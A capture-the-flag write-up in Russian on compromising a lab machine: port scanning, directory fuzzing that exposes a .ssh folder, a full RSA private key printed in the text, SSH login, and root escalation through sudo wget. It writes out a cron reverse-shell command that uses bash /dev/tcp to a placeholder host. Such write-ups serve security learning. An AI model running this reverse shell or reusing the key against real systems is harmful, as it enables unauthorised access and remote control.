Запускаем первоначальное сканирование nmap. Оно показывает два открытых порта. Нестандартных портов нету.
```
Nmap scan report for 10.114.156.92
Host is up (0.010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up)
```

Уточним и проверим версии сервисов и переходим к изучению веб-сервера.
```
Host is up (0.0099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Нас встречает стандартная страница apache, запускаем фаззер скрытых директорий.

![](../images/Pasted%20image%2020260603235918.png)

Находим интересную директорию, смотрим что там
```
sitemap                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 201ms]
```

Это какой-то шаблон сайта, там можно под блог переделать или под магазин, но всё не доделано.

![](../images/Pasted%20image%2020260604000337.png)

Прокрутим еще дальше ffuf. Находим эту директорию.
```
sass                    [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 93ms]
```

После этого я очень много изучал файлы внутри нее, потом искал другие файлы и ничего не нашел. Начал изучать веб-сайт дальше.

Тут мне показалось, что есть намек на бэкап, поэтому начал фаззить бэкап файлы, но тоже их не нашел.

![](../images/Pasted%20image%2020260604131325.png)

Через время я запустил другой словарь фаззинга и нашел новую директорию.
```
.ssh                    [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 3088ms]
```

Переходим туда и видим файл id_rsa

![](../images/Pasted%20image%2020260604151027.png)

Это кажется ключ ssh, по которому можно войти в ssh. Осталось определить имя пользователя.
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```

Я пролистал внешне все страницы и из имен нашел только эти, попробовал их и ничего не вышло.

![](../images/Pasted%20image%2020260604152242.png)

Пока я искал имена мне удалось сбрутить имя пользователя, им оказалось jessie

![](../images/Pasted%20image%2020260604165711.png)

Подключаемся через ssh и читаем флаг пользователя

![](../images/Pasted%20image%2020260604165934.png)

Далее я решил начать с просмотра SUID файлов и проверки, есть ли компиляторы. Всё дало положительный знак. Мне понравился файл pppd, он не выглядит стандартным и я в интернете нашел пути эскалации через него.

![](../images/Pasted%20image%2020260604170333.png)

Эта уязвимость `CVE-2014-3158`, попробуем воспользоваться ею.

Через время я понял, что он просто возвращает ошибку и ничего не получилось.

![](../images/Pasted%20image%2020260604170851.png)

Далее я решил проверить sudo -l, какие программы я могу запустить от имени рута и обнаружил wget. Есть гарантированные пути эскалации через него.

![](../images/Pasted%20image%2020260604172017.png)

Создаем крон задачу на реверс шел и открываем пайтон сервер.
```
echo '* * * * * root bash -c "bash -i >& /dev/tcp/МОЙ_IP/МОЙ_ПОРТ 0>&1"' > cron_shell
```

Скачиваем от имени рута этот файл, теперь этот файл автоматически будет исполняться каждую минуту от имени рута.

![](../images/Pasted%20image%2020260604171845.png)

Открываем слушание порта 4444, принимаем входящее соединение и читаем флаг root пользователя.

![](../images/Pasted%20image%2020260604171921.png)

